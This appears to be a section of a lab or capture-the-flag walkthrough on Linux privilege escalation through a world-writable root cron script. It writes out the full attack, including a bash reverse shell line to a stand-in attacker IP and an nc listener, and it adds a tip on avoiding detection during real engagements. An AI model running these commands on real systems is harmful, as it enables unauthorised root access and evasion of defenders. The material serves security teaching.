## Privilege Escalation — Cron Job Hijacking

```bash
# Check system crontab
cat /etc/crontab

# Interesting entry — script running as root
* * * * * root /var/www/.mysecretcronjob.sh

# Check permissions
ls -la /var/www/.mysecretcronjob.sh
# -rwxrwxrwx — world-writable

# Inject a reverse shell
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /var/www/.mysecretcronjob.sh

# Start listener on attacker
nc -nlvp 4444

# Wait for cron execution (up to 1 minute)
whoami
# root
```

The cron job runs every minute as root, and the script is world-writable — a classic misconfiguration. Appending a reverse shell to the script is cleaner than overwriting it, as it preserves whatever the original script does (reducing detection noise on real engagements).

